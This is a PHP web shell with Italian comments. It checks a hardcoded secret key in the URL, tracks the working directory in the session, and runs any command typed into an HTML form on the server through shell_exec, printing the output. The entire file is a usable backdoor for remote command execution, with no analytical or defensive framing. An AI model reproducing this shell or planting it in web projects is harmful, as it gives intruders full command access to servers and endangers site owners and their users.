<?php
session_start();

// Configurazione
define('SECRET_KEY', 'mysecretkey');
if (!isset($_GET['key']) || $_GET['key'] !== SECRET_KEY) {
    die('Access denied');
}

// Variabile di sessione per tenere traccia della directory corrente
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd(); // Directory iniziale
}

// Cambio directory
if (isset($_POST['cmd']) && preg_match('/^cd\s+(.+)/', $_POST['cmd'], $matches)) {
    $new_dir = $matches[1];
    if (is_dir($new_dir) && chdir($new_dir)) {
        $_SESSION['current_dir'] = realpath($new_dir);
    } else {
        echo "Directory non valida o impossibile da cambiare.\n";
    }
} else {
    // Esegui altri comandi nella directory corrente
    chdir($_SESSION['current_dir']);
    if (isset($_POST['cmd'])) {
        echo "<pre>" . shell_exec($_POST['cmd'] . " 2>&1") . "</pre>";
    }
}

// Mostra la directory corrente
echo "Directory corrente: " . $_SESSION['current_dir'] . "\n";
?>

<html>
<body>
    <form method="post">
        <input type="text" name="cmd" placeholder="Command" />
        <button type="submit">Execute</button>
    </form>
</body>
</html>
